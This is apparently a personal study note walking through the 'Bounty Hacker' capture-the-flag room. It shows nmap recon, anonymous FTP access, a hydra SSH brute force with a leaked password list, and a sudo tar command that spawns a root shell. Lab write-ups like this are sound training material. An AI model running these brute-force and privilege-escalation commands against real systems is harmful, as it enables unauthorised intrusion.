---
created: 2026-04-28
tags:
  - note
  - journal
  - cyberStuff
title: Bounty Hacker
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-09T12:28:55.456Z
---
Very easy room.\
Run nmap for initial recon:

```
sudo nmap $IP -sCV -p-   
```

We can see that FTP is open on port 21, and we can log in as anonymous. Cool, let's do that:

```
ftp $IP 
```

We found two files inside: one is a password file and the other is a task list written by someone called lin. Interesting; we can try to brute-force SSH with username lin and the password file we just got using hydra:

```
hydra hydra -l lin -P locks.txt ssh://$IP
```

And like that, we get the SSH password and we can log in as lin:

```
ssh lin@$IP
```

Just run ls, then cat the flag.\
Now run sudo -l to see how we can escalate our privileges:

```
sudo -l
```

The output says we can run /bin/tar with sudo. Let's search on GTFOBins:\
![](/images/static/Pasted%20image%2020260428064540.png)\
Just run this command with sudo, and we get root and the flag:

```
sudo /bin/tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

Now we can just cd /root, ls, and cat.
